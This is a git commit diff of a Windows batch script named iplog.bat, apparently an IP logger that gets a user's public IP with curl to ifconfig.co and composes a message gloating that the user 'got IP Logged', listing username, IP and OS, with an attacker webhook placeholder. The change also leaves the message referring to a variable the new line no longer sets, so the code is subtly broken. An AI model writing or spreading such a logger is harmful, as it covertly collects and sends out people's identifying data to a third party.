3d0817a1cb44fefb04f11678b9bea48a76ed477f
Dazd <87366355+Dazd-Pkz@users.noreply.github.com>
2023-01-16 07:58:45 +0100

    Update iplog.bat

--- iplog.bat
+++ iplog.bat
@@ -3,7 +3,7 @@
 set webhook=[WEBHOOK HERE WITHOUT BRACKETS]
 
 :: GETTING THE IP
-curl -4 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip
+curl ifconfig.co/>ip&cls&set/p ip=<ip
 
 :: CUSTOM MESSAGE
 set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 
